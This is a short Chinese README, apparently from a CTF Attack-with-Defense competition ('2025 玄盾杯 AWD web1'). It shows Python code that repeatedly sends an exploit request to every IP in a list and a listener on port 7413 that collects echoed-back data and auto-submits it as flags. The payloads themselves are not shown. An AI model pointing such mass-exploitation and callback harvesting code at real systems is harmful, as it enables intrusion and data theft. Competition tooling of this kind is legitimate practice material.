# 当前文件夹是 2025 玄盾杯 AWD web1的代码组合

使用了本项目 WebStepper + echout 实现了自动化获取并提交flag

## 关键代码
main.py 
```python
from web import WebPayload, WebStep, file2ip_list, file2http_request
import time

web1 = [
    WebPayload(
        [
            WebStep(
                # $IP
                file2http_request("./requests/web1.http"),
            ),
        ],
    )
]

if __name__ == "__main__":
    while True:
        list(
            map(lambda ip: web1[0].exploit({"$IP": ip}).check(), file2ip_list("ip.txt"))
        )
        time.sleep(60 * 4)

```
echout.py
```python
# configuration
HOST = "0.0.0.0"
PORT = 7413
DB_FILE = "echout.db"
LIMIT = 50


def handle_record(record: EchoRecord):
    from web import WebStep, file2http_request

    send_flag_step = WebStep(
        request_message_template=file2http_request("./requests/submit_flag.http"),
        pre_replace={"$IP": record.ip, "$FLAG": record.data},
    )
    print(send_flag_step.step())


# configuration end
```

